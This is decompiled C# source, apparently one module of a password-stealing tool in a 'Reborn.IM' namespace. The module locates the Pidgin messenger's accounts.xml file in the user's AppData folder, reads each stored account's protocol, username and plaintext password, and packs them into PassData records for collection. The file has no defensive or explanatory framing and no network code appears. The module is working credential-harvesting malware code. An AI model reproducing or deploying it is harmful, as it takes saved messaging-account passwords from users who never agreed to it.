using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Xml;

namespace Reborn.IM
{
	// Token: 0x0200001A RID: 26
	internal static class Pidgin
	{
		// Token: 0x060000C1 RID: 193 RVA: 0x00007C54 File Offset: 0x00005E54
		public static List<PassData> Initialise()
		{
			List<PassData> result;
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\.purple\\accounts.xml";
				if (!File.Exists(text))
				{
					result = null;
				}
				else
				{
					XmlTextReader reader = new XmlTextReader(text);
					XmlDocument expr_30 = new XmlDocument();
					expr_30.Load(reader);
					IEnumerable<XmlNode> arg_65_0 = expr_30.DocumentElement.ChildNodes.Cast<XmlNode>();
					Func<XmlNode, XmlNodeList> arg_65_1;
					if ((arg_65_1 = Pidgin.<>c.<>9__0_0) == null)
					{
						arg_65_1 = (Pidgin.<>c.<>9__0_0 = new Func<XmlNode, XmlNodeList>(Pidgin.<>c.<>9.<Initialise>b__0_0));
					}
					IEnumerable<XmlNodeList> arg_89_0 = arg_65_0.Select(arg_65_1);
					var arg_89_1;
					if ((arg_89_1 = Pidgin.<>c.<>9__0_1) == null)
					{
						arg_89_1 = (Pidgin.<>c.<>9__0_1 = new Func<XmlNodeList, <>f__AnonymousType0<XmlNodeList, string>>(Pidgin.<>c.<>9.<Initialise>b__0_1));
					}
					var arg_AD_0 = arg_89_0.Select(arg_89_1);
					var arg_AD_1;
					if ((arg_AD_1 = Pidgin.<>c.<>9__0_2) == null)
					{
						arg_AD_1 = (Pidgin.<>c.<>9__0_2 = new Func<<>f__AnonymousType0<XmlNodeList, string>, <>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>>(Pidgin.<>c.<>9.<Initialise>b__0_2));
					}
					var arg_D1_0 = arg_AD_0.Select(arg_AD_1);
					var arg_D1_1;
					if ((arg_D1_1 = Pidgin.<>c.<>9__0_3) == null)
					{
						arg_D1_1 = (Pidgin.<>c.<>9__0_3 = new Func<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, <>f__AnonymousType2<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, string>>(Pidgin.<>c.<>9.<Initialise>b__0_3));
					}
					var arg_F5_0 = arg_D1_0.Select(arg_D1_1);
					var arg_F5_1;
					if ((arg_F5_1 = Pidgin.<>c.<>9__0_4) == null)
					{
						arg_F5_1 = (Pidgin.<>c.<>9__0_4 = new Func<<>f__AnonymousType2<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, string>, PassData>(Pidgin.<>c.<>9.<Initialise>b__0_4));
					}
					result = arg_F5_0.Select(arg_F5_1).ToList<PassData>();
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine("Pidgin : " + arg);
				result = null;
			}
			return result;
		}

		// Token: 0x0200001B RID: 27
		[CompilerGenerated]
		[Serializable]
		private sealed class <>c
		{
			// Token: 0x060000C4 RID: 196 RVA: 0x00002CD7 File Offset: 0x00000ED7
			internal XmlNodeList <Initialise>b__0_0(XmlNode objXmlNode)
			{
				return objXmlNode.ChildNodes;
			}

			// Token: 0x060000C5 RID: 197 RVA: 0x00002CDF File Offset: 0x00000EDF
			internal <>f__AnonymousType0<XmlNodeList, string> <Initialise>b__0_1(XmlNodeList InnerList)
			{
				return new
				{
					InnerList = InnerList,
					Protocol = InnerList[0].InnerText
				};
			}

			// Token: 0x060000C6 RID: 198 RVA: 0x00002CF7 File Offset: 0x00000EF7
			internal <>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string> <Initialise>b__0_2(<>f__AnonymousType0<XmlNodeList, string> <>h__TransparentIdentifier0)
			{
				return new
				{
					<>h__TransparentIdentifier0 = <>h__TransparentIdentifier0,
					Username = <>h__TransparentIdentifier0.InnerList[1].InnerText
				};
			}

			// Token: 0x060000C7 RID: 199 RVA: 0x00002D14 File Offset: 0x00000F14
			internal <>f__AnonymousType2<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, string> <Initialise>b__0_3(<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string> <>h__TransparentIdentifier1)
			{
				return new
				{
					<>h__TransparentIdentifier1 = <>h__TransparentIdentifier1,
					Password = <>h__TransparentIdentifier1.<>h__TransparentIdentifier0.InnerList[2].InnerText
				};
			}

			// Token: 0x060000C8 RID: 200 RVA: 0x00002D36 File Offset: 0x00000F36
			internal PassData <Initialise>b__0_4(<>f__AnonymousType2<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, string> <>h__TransparentIdentifier2)
			{
				return new PassData
				{
					Program = "Pidgin",
					Url = "Jabber",
					Login = <>h__TransparentIdentifier2.<>h__TransparentIdentifier1.Username,
					Password = <>h__TransparentIdentifier2.Password
				};
			}

			// Token: 0x0400004F RID: 79
			public static readonly Pidgin.<>c <>9 = new Pidgin.<>c();

			// Token: 0x04000050 RID: 80
			public static Func<XmlNode, XmlNodeList> <>9__0_0;

			// Token: 0x04000051 RID: 81
			public static Func<XmlNodeList, <>f__AnonymousType0<XmlNodeList, string>> <>9__0_1;

			// Token: 0x04000052 RID: 82
			public static Func<<>f__AnonymousType0<XmlNodeList, string>, <>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>> <>9__0_2;

			// Token: 0x04000053 RID: 83
			public static Func<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, <>f__AnonymousType2<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, string>> <>9__0_3;

			// Token: 0x04000054 RID: 84
			public static Func<<>f__AnonymousType2<<>f__AnonymousType1<<>f__AnonymousType0<XmlNodeList, string>, string>, string>, PassData> <>9__0_4;
		}
	}
}
